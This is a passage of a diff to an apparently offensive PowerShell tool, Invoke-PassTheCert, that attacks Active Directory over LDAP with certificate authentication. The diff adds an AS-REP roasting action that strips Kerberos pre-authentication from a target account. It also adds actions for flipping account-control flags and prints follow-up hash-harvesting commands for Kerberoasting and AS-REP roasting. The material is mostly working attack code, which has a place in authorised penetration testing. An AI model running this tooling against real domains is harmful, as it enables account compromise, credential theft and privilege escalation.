     Write-Verbose "[*] Adding Member '$IdentityDN' To Group '$GroupDN'..."
 
-    $LdapConnection.SendRequest(
-        (New-Object System.DirectoryServices.Protocols.ModifyRequest(
-            $GroupDN, 
-            [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Add, 
-            "member", 
-            $IdentityDN
-        ))
-    ) |Out-Null
+    _AddValueInAttribute -LdapConnection $LdapConnection -ObjectDN $GroupDN -Attribute 'member' -Value $IdentityDN
 
     Write-Host "[+] Successfully Added Member '$IdentityDN' To Group '$GroupDN' !"
     Write-Host "[*] [Check] Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection `$LdapConnection -Enum 'GroupMembers' -Name '$(_Helper-GetCNFromDN -DN $GroupDN)'"
     Write-Host "[*] [Restore] Invoke-PassTheCert -Action 'RemoveGroupMember' -LdapConnection `$LdapConnection -Identity '$IdentityDN' -GroupDN '$GroupDN'"
-
-    return
 }
 
 
@@ -10499,12 +10461,6 @@ function _RemoveGroupMember {
             [System.String] 
             
             The identity of the group in which a member must be removed.
-
-        .EXAMPLE
-
-            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']
-
-            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.
 
         .EXAMPLE
 
@@ -10539,19 +10495,11 @@ function _RemoveGroupMember {
 
     Write-Verbose "[*] Removing Member '$IdentityDN' From Group '$GroupDN'..."
 
-    $LdapConnection.SendRequest(
-        (New-Object System.DirectoryServices.Protocols.ModifyRequest(
-            $GroupDN, 
-            [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete, 
-            "member", 
-            $IdentityDN
-        ))
-    ) |Out-Null
+    _RemoveValueInAttribute -LdapConnection $LdapConnection -ObjectDN $GroupDN -Attribute 'member' -Value $IdentityDN
 
     Write-Host "[+] Successfully Removed Member '$IdentityDN' From Group '$GroupDN' !"
     Write-Host "[*] [Check] Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection `$LdapConnection -Enum 'GroupMembers' -Name '$(_Helper-GetCNFromDN -DN $GroupDN)'"
     Write-Host "[*] [Restore] Invoke-PassTheCert -Action 'AddGroupMember' -LdapConnection `$LdapConnection -Identity '$IdentityDN' -GroupDN '$GroupDN'"
-    return
 }
 
 
@@ -10571,7 +10519,7 @@ function _LDAPEnum {
 
         .PARAMETER Enum 
 
-            AD Enumeration to be performed (e.g. `Kerberoasting`) (Mandatory)
+            LDAP Enumeration to be performed (e.g. `Kerberoasting`)
 
         .PARAMETER SearchBase
         
@@ -10584,12 +10532,6 @@ function _LDAPEnum {
             The Seach Base of the LDAP lookup (accepted values: 'Base', 'OneLevel', 'Subtree')
 
             - If not specified, defaults to Subtree (or `Base`, for RootDSE enumeration)
-        
-        .EXAMPLE
-
-            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']
-
-            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.
 
         .EXAMPLE
 
@@ -11252,7 +11194,7 @@ function _LDAPExploit {
 
         .SYNOPSIS
 
-            Invoke-PassTheCert wrapper for LDAP exploitation
+            Invoke-PassTheCert wrapper for LDAP exploitations.
 
         .PARAMETER LdapConnection
 
@@ -11262,13 +11204,7 @@ function _LDAPExploit {
 
         .PARAMETER Exploit 
 
-            AD Exploitation to be performed (e.g. `Kerberoasting`).
-
-        .EXAMPLE
-
-            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']
-
-            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.
+            LDAP Exploitation to be performed (e.g. `Kerberoasting`).
 
         .EXAMPLE
 
@@ -11277,6 +11213,14 @@ function _LDAPExploit {
             Adds the provided `-SPN` (or, if not specified, random) to the specified account's `serviceprincipalname` attribute.
 
             - This requires WRITE privileges against the target's `servicePrincipalName` attribute.
+
+        .EXAMPLE
+
+            _LDAPExploit -LdapConnection $LdapConnection -Exploit 'ASREPRoasting' -TargetDN 'CN=John JD. DOE,CN=Users,DC=X'
+
+            Adds the `DONT_REQ_PREAUTH` UAC Flag into the to the specified account's `useraccountcontrol` attribute.
+
+            - This requires WRITE privileges against the target's `useraccountcontrol` attribute.
 
         .EXAMPLE
 
@@ -11365,6 +11309,19 @@ function _LDAPExploit {
 
             Write-Host "[*$Exploit*] [+] Successfully Added SPN '$SPN' Into The '$TargetDN':'serviceprincipalname' Attribute !!"
             Write-Host "[*$Exploit*] [Exploit] GetUserSPNs.py  <domain>/'<user>':'<password>' -dc-ip <dc_ip> -request-user '$((_Filter -LdapConnection $LdapConnection -SearchBase $TargetDN -SearchScope 'Base' -Properties 'sAMAccountName').sAMAccountName)' -target-domain $(_Helper-GetDomainNameFromDN -DN $TargetDN) -outputfile kerberoast_tgs.hashes"
+        }
+
+        'ASREPRoasting' {
+            
+            if (-not (_Helper-IsEveryValueOfArrayDefined @($TargetDN))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Couldn't Be Found, Or Is Missing ! Check Examples Adding -h ! Returning..."; return; }
+            
+            Write-Verbose "[*$Exploit*] [*] Trying To Add UAC Flag 'DONT_REQ_PREAUTH' Into The '$TargetDN':'useraccountcontrol' Attribute..."
+            
+            _AddUACFlags -LdapConnection $LdapConnection -IdentityDN $TargetDN -UACFlags 'DONT_REQ_PREAUTH'
+
+            Write-Host "[*$Exploit*] [+] Successfully Added UAC Flag 'DONT_REQ_PREAUTH' Into The '$TargetDN':'useraccountcontrol' Attribute !!"
+            Write-Host "[*$Exploit*] [Check] Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection `$LdapConnection -Enum 'ASREPRoasting'"
+            Write-Host "[*$Exploit*] [Exploit] GetNPUsers.py -dc-ip <dc_ip> '<domain>/<user>':'<password>' -request -format hashcat -outputfile ASREProastables.txt -usersfile <target.txt>"
         }
 
         'DCSync' {
@@ -11655,12 +11612,6 @@ function _TODO {
 
         .EXAMPLE
 
-            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']
-
-            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.
-
-        .EXAMPLE
-
             _TODO -LdapConnection $LdapConnection -Customizator 'Customorus1'
 
             Customizing'ly Customizes a Customized Customization whose customed value is `Customorus1` using the `root` Customizatoration (default) against which a Customization must be applied on Customizing'ly.
@@ -11888,12 +11839,6 @@ function Invoke-PassTheCert-ExportLDAPConnectionInstanceToFile {
 
         .EXAMPLE
 
-            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']
-
-            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.
-
-        .EXAMPLE
-
             Invoke-PassTheCert-ExportLDAPConnectionInstanceToFile -LdapConnection $LdapConnection -ExportPath '.\Certified.pfx' -ExportContentType 'pfx' -ExportPassword 'ExP0rTP@sssw0Rd123!'
 
             Exports the $LdapConnection LDAP Connection Instance into the PFX file '.\Certified.pfx', protected with password 'ExP0rTP@sssw0Rd123!'
@@ -12063,12 +12008,6 @@ function Invoke-PassTheCert {
 
         .EXAMPLE
 
-            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']
-
-            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.
-
-        .EXAMPLE
-
             Import-Module .\Invoke-PassTheCert.ps1
 
             Imports the Public PowerShell Functions of the Invoke-PassTheCert.ps1 script into the current PowerShell session.
@@ -12124,6 +12063,8 @@ function Invoke-PassTheCert {
             'AddValueInAttribute',
             'RemoveValueInAttribute',
             'ClearAttribute',
+            'AddUACFlags',
+            'RemoveUACFlags',
             'ShowStatusOfAccount',
             'EnableAccount',
             'DisableAccount',
@@ -12442,6 +12383,12 @@ function Invoke-PassTheCert {
             }
             "ClearAttribute" { 
                 $Result = _ClearAttribute -LdapConnection $LdapConnection -ObjectDN $ObjectDN -Attribute $Attribute;
+            }
+            "AddUACFlags" {
+                $Result = _AddUACFlags -LdapConnection $LdapConnection -IdentityDN $IdentityDN -UACFlags $UACFlags;
+            }
+            "RemoveUACFlags" { 
+                $Result = _RemoveUACFlags -LdapConnection $LdapConnection -IdentityDN $IdentityDN -UACFlags $UACFlags;
             }
             "ShowStatusOfAccount" { 
                 $Result = _ShowStatusOfAccount -LdapConnection $LdapConnection -IdentityDN $IdentityDN;
